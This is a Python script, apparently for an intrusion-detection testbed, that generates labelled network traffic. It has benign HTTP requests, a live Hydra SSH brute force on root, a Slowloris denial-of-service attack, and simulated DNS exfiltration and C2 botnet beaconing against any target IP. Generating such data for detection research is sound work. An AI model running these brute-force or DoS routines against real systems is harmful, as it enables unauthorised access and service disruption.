"""
attack_flow.py — Offensive traffic simulation utility for FL-CL testbed.

Pure-Python implementations to avoid external tool dependencies.

Runs on: Traffic Generator VM (VM 400)
"""
import argparse
import socket
import ssl
import subprocess
import threading
import time
import urllib.request


# ─── Benign Traffic ─────────────────────────────────────────────────────────

def run_benign(target, duration):
    print(f"[*] Starting Benign background traffic to {target} for {duration}s...")
    start_time = time.time()
    requests_sent = 0
    while time.time() - start_time < duration:
        try:
            with urllib.request.urlopen(f"http://{target}:80/", timeout=2) as response:
                response.read()
            requests_sent += 1
        except Exception:
            pass
        time.sleep(0.3)
    print(f"[*] Benign traffic completed. {requests_sent} requests sent.")


# ─── SSH Brute Force ────────────────────────────────────────────────────────

def run_ssh_brute(target, duration):
    print(f"[*] Starting SSH Brute Force attack on {target} for {duration}s...")
    # Use fasttrack.txt since it is uncompressed on Kali by default
    cmd = f"hydra -l root -P /usr/share/wordlists/fasttrack.txt ssh://{target} -t 4"
    proc = subprocess.Popen(cmd.split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(duration)
    proc.terminate()
    proc.wait()
    print("[*] SSH Brute Force completed/terminated.")


# ─── Slowloris DoS ──────────────────────────────────────────────────────────

def run_slowloris(target, duration, port=80):
    print(f"[*] Starting Slowloris DoS on {target}:{port} for {duration}s...")
    cmd = f"/root/traffic-env/bin/slowloris {target} -p {port} -s 100"
    proc = subprocess.Popen(cmd.split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(duration)
    proc.terminate()
    proc.wait()
    print("[*] Slowloris DoS completed/terminated.")


# ─── DNS Exfiltration (bonus attack type) ───────────────────────────────────

def run_dns_exfil(target, duration):
    """Simulates DNS exfiltration by sending many small DNS-like UDP packets."""
    print(f"[*] Starting DNS Exfiltration simulation to {target} for {duration}s...")

    start_time = time.time()
    packets = 0

    while time.time() - start_time < duration:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(1)
            # Craft a minimal DNS-like query payload
            payload = b"\xaa\xbb\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
            # Add a fake subdomain query (simulates data exfiltration)
            label = f"exfil{int(time.time()) % 10000}".encode()
            payload += bytes([len(label)]) + label
            payload += b"\x07example\x03com\x00\x00\x01\x00\x01"
            sock.sendto(payload, (target, 53))
            sock.close()
            packets += 1
        except Exception:
            pass
        time.sleep(0.05)

    print(f"[*] DNS Exfiltration completed. {packets} packets sent.")


# ─── C2 Botnet Beacon ───────────────────────────────────────────────────────

def run_botnet_beacon(target, duration):
    """Simulates C2 botnet beaconing on ports 8080/8888/9000.

    Each beacon opens a persistent TCP session with multiple send/recv
    heartbeat rounds, mimicking real C2 command polling.  This produces
    flows with higher packet counts and longer durations than simple
    SYN-only probes, making them distinguishable from DoS traffic at
    the flow-feature level.
    """
    import random
    print(f"[*] Starting Botnet C2 beaconing to {target} for {duration}s...")

    c2_ports = [8080, 8888, 9000]
    start_time = time.time()
    beacons = 0

    while time.time() - start_time < duration:
        port = random.choice(c2_ports)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((target, port))

            # Simulate multi-round C2 heartbeat within one session
            rounds = random.randint(3, 8)
            for _ in range(rounds):
                # Send beacon check-in with randomised payload
                payload = (
                    f"POST /beacon HTTP/1.1\r\n"
                    f"Host: c2server\r\n"
                    f"X-Bot-Id: {random.randint(1000,9999)}\r\n"
                    f"Content-Length: {random.randint(20,200)}\r\n"
                    f"\r\n"
                    f"{'A' * random.randint(20,200)}"
                ).encode()
                sock.sendall(payload)

                # Wait for C2 response (will likely RST, but that's ok)
                try:
                    sock.recv(1024)
                except (socket.timeout, ConnectionError):
                    pass

                # Jittered inter-heartbeat delay (0.3–1.5s)
                time.sleep(random.uniform(0.3, 1.5))

            sock.close()
            beacons += 1
        except Exception:
            pass
        # Jittered inter-session delay (0.5–3s) — realistic C2 polling
        time.sleep(random.uniform(0.5, 3.0))

    print(f"[*] Botnet C2 beaconing completed. {beacons} sessions sent.")


# ─── Main ───────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="FL-CL Attack Flow Generator")
    parser.add_argument("--mode", choices=["ssh", "slowloris", "benign", "dns_exfil", "botnet"], required=True)
    parser.add_argument("--target", required=True, help="Target IP address")
    parser.add_argument("--duration", type=int, default=30, help="Duration in seconds")
    parser.add_argument("--port", type=int, default=80, help="Target port for Slowloris")
    args = parser.parse_args()

    if args.mode == "ssh":
        run_ssh_brute(args.target, args.duration)
    elif args.mode == "slowloris":
        run_slowloris(args.target, args.duration, args.port)
    elif args.mode == "benign":
        run_benign(args.target, args.duration)
    elif args.mode == "dns_exfil":
        run_dns_exfil(args.target, args.duration)
    elif args.mode == "botnet":
        run_botnet_beacon(args.target, args.duration)


if __name__ == "__main__":
    main()
